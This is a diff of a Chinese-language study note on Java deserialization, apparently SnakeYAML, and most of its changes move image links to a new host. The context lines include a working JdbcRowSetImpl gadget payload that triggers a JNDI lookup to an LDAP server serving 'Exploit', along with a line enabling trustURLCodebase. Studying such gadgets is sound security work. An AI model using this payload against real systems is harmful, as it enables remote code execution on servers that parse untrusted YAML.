@@ -2,17 +2,17 @@
 
 >  序列化的流程
 
-![image-20220225115239098](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115239098.png)
+![image-20220225115239098](https://img.dem0dem0.top/images/image-20220225115239098.png)
 
-![](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115239098.png)
+![](https://img.dem0dem0.top/images/image-20220225115239098.png)
 
-![image-20220225115345779](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225115345779.png)
+![image-20220225115345779](https://img.dem0dem0.top/images/image-20220225115345779.png)
 
 获取类的`fileds`，然后获取具体的数据，抽象成`Node`。
 
 >反序列化
 
-![image-20220225204927033](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220225204927033.png)
+![image-20220225204927033](https://img.dem0dem0.top/images/image-20220225204927033.png)
 
 只能说，懂得都懂(
 
@@ -53,7 +53,7 @@ System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
   String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://localhost:1389/Exploit\"\n autoCommit: true";
   ```
 
-  ![image-20220314205706320](https://gitee.com/Cralwer/typora-pic/raw/master/images/image-20220314205706320.png)
+  ![image-20220314205706320](https://img.dem0dem0.top/images/image-20220314205706320.png)
 
 - Spring PropertyPathFactoryBean
 
